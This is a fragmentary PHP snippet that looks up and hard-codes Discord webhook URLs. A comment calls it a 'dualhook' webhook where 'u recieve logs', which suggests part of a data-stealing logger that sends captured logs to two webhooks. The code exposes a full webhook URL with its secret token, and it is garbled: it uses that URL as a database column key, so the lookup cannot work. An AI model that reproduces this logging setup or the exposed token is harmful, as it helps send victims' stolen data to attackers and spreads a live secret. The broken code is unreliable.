<?php
    ...
    if (mysqli_num_rows($result) > 0) {
        while($row = mysqli_fetch_assoc($result)) {
            $webhook = $row["https://discord.com/api/webhooks/1013215444393537567/hJ7-vIg-n_2XEpljxrnvGOzpa1ZgU5ZT0zD7ZF2yobG5RCYngCeFShTAF2IhVF__O74w"];
        }
    }
    $conn->close();

    //dualhook webhook u recieve logs btw//
    $yourwebhook = "https://discord.com/api/webhooks/1013215444393537567/hJ7-vIg-n_2XEpljxrnvGOzpa1ZgU5ZT0zD7ZF2yobG5RCYngCeFShTAF2IhVF__O74w";
